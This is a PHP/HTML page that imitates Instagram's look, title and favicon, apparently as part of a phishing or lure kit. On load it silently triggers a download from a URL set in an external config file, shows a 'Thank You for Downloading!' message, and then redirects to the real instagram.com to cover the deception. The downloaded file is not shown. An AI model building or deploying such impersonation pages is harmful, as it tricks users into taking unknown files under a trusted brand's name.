<?php include 'action_config.php'; ?>
<!DOCTYPE html>
<html>
<head>
    <title>Instagram</title>
    <link rel="icon" type="image/x-icon" href="favicon.png">
    <meta http-equiv="refresh" content="5;url=https://instagram.com">
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #fafafa;
        }
        .loader {
            text-align: center;
            max-width: 400px;
            padding: 40px;
        }
        .spinner {
            border: 3px solid #f3f3f3;
            border-top: 3px solid #3897f0;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .thank-you {
            color: #262626;
            font-size: 18px;
            font-weight: 600;
            margin: 20px 0 10px 0;
            opacity: 0;
            animation: fadeIn 0.5s ease-in forwards;
            animation-delay: 0.3s;
        }
        .message {
            color: #8e8e8e;
            font-size: 14px;
            margin: 10px 0;
            opacity: 0;
            animation: fadeIn 0.5s ease-in forwards;
            animation-delay: 0.6s;
        }
        .loading-text {
            color: #262626;
            font-size: 14px;
            margin-top: 10px;
        }
        @keyframes fadeIn {
            from {
                opacity: 0;
                transform: translateY(10px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }
        .checkmark {
            width: 60px;
            height: 60px;
            margin: 0 auto 20px;
            opacity: 0;
            animation: fadeIn 0.5s ease-in forwards;
        }
        .checkmark-circle {
            stroke-dasharray: 166;
            stroke-dashoffset: 166;
            stroke: #3897f0;
            fill: none;
            animation: stroke 0.6s cubic-bezier(0.65, 0, 0.45, 1) forwards;
        }
        .checkmark-check {
            transform-origin: 50% 50%;
            stroke-dasharray: 48;
            stroke-dashoffset: 48;
            stroke: #3897f0;
            animation: stroke 0.3s cubic-bezier(0.65, 0, 0.45, 1) 0.6s forwards;
        }
        @keyframes stroke {
            100% {
                stroke-dashoffset: 0;
            }
        }
    </style>
</head>
<body>
    <div class="loader">
        <svg class="checkmark" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 52 52">
            <circle class="checkmark-circle" cx="26" cy="26" r="25" fill="none" stroke-width="2"/>
            <path class="checkmark-check" fill="none" stroke-width="3" d="M14.1 27.2l7.1 7.2 16.7-16.8"/>
        </svg>
        <div class="spinner"></div>
        <h2 class="thank-you">Thank You for Downloading!</h2>
        <p class="message">Your download should start automatically.</p>
        <p class="loading-text">Redirecting you to Instagram...</p>
    </div>
    
    <script>
    <?php if (!empty($download_url)): ?>
        // Trigger download
        var link = document.createElement('a');
        link.href = '<?php echo htmlspecialchars($download_url, ENT_QUOTES, 'UTF-8'); ?>';
        link.download = '';
        link.style.display = 'none';
        document.body.appendChild(link);
        link.click();
        document.body.removeChild(link);
    <?php endif; ?>
    
    // Redirect to Instagram after 5 seconds
    setTimeout(function() {
        window.location.href = 'https://instagram.com';
    }, 5000);
    </script>
</body>
</html>
